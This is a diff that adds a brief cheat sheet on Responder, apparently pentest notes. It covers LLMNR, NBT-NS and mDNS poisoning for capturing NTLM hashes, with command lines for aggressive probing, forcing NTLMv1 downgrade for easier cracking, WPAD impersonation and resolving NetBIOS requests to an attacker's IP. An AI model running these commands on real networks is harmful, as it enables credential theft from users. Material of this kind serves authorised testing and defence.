@@ -1,0 +1,29 @@
+# Responder
+
+- Responder is a tool used for poisoning LLMNR, NBT-NS, and mDNS queries, selectively 
+  responding based on query types, primarily targeting SMB services.
+
+- It comes pre-installed in Kali Linux, configurable at /etc/responder/Responder.conf.
+
+- Responder displays captured hashes on the screen and saves them in 
+  the /usr/share/responder/logs directory.
+
+- It supports both IPv4 and IPv6.
+
+# Running Responder
+
+
+- To run Responder with default settings: 
+  responder -I <Interface>
+
+- For more aggressive probing (with potential side effects): 
+  responder -I <Interface> -P -r -v
+
+- Techniques to capture NTLMv1 challenges/responses for easier cracking: 
+  responder -I <Interface> --lm --disable-ess
+
+- WPAD impersonation can be activated with: 
+  responder -I <Interface> --wpad
+
+- NetBIOS requests can be resolved to the attacker’s IP, and an authentication proxy can be set up: 
+  responder.py -I <interface> -Pv
